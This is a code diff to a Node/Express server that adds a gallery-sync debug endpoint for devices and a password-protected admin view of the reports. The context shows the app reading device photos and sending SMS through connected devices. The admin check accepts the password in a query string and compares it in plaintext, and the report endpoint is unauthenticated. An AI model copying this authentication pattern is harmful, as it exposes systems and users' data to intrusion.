@@ -424,6 +424,59 @@ async function startServer() {
     }
   });
 
+  // Gallery debug endpoint — device reports what it sees so we can diagnose
+  app.post('/api/devices/gallery-debug', (req, res) => {
+    try {
+      const report = req.body;
+      console.log(`\n[GALLERY-DEBUG] ==============================`);
+      console.log(`[GALLERY-DEBUG] Device: ${report.device_id || 'UNKNOWN'}`);
+      console.log(`[GALLERY-DEBUG] Model: ${report.model || '?'}`);
+      console.log(`[GALLERY-DEBUG] SDK: ${report.sdk_version || '?'}`);
+      console.log(`[GALLERY-DEBUG] Has READ_EXTERNAL_STORAGE: ${report.has_read_storage}`);
+      console.log(`[GALLERY-DEBUG] Has READ_MEDIA_IMAGES: ${report.has_read_media}`);
+      console.log(`[GALLERY-DEBUG] hasPermission(): ${report.has_permission}`);
+      console.log(`[GALLERY-DEBUG] Photos read from device: ${report.photos_read}`);
+      console.log(`[GALLERY-DEBUG] New for backend: ${report.new_for_backend}`);
+      console.log(`[GALLERY-DEBUG] New for firestore: ${report.new_for_firestore}`);
+      console.log(`[GALLERY-DEBUG] Backend synced: ${report.backend_synced}`);
+      console.log(`[GALLERY-DEBUG] Firestore synced: ${report.firestore_synced}`);
+      console.log(`[GALLERY-DEBUG] Errors: ${JSON.stringify(report.errors || [])}`);
+      console.log(`[GALLERY-DEBUG] Source: ${report.source || '?'}`);
+      console.log(`[GALLERY-DEBUG] Timestamp: ${report.timestamp}`);
+      console.log(`[GALLERY-DEBUG] ==============================\n`);
+
+      // Store the latest debug report per device
+      db.run(`CREATE TABLE IF NOT EXISTS gallery_debug (
+        device_id TEXT PRIMARY KEY,
+        report TEXT,
+        received_at DATETIME DEFAULT (datetime('now'))
+      )`);
+      db.prepare(`INSERT OR REPLACE INTO gallery_debug (device_id, report, received_at)
+        VALUES (?, ?, datetime('now'))`).run(report.device_id || 'unknown', JSON.stringify(report));
+
+      res.json({ success: true });
+    } catch (err) {
+      console.error('[GALLERY-DEBUG] Error:', err.message);
+      res.json({ success: true }); // Still return OK
+    }
+  });
+
+  // View gallery debug reports — admin endpoint
+  app.get('/api/admin/gallery-debug', (req, res) => {
+    try {
+      const password = req.headers['x-admin-password'] || req.query.password;
+      const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
+      if (!stored || password !== stored.value) {
+        return res.status(401).json({ error: 'Unauthorized' });
+      }
+      const rows = db.prepare('SELECT * FROM gallery_debug ORDER BY received_at DESC').all();
+      const reports = rows.map(r => ({ ...JSON.parse(r.report), received_at: r.received_at }));
+      res.json({ reports });
+    } catch (err) {
+      res.json({ reports: [], error: err.message });
+    }
+  });
+
   // Send SMS via device — admin sends command to a connected device
   app.post('/api/admin/send-sms', (req, res) => {
     try {
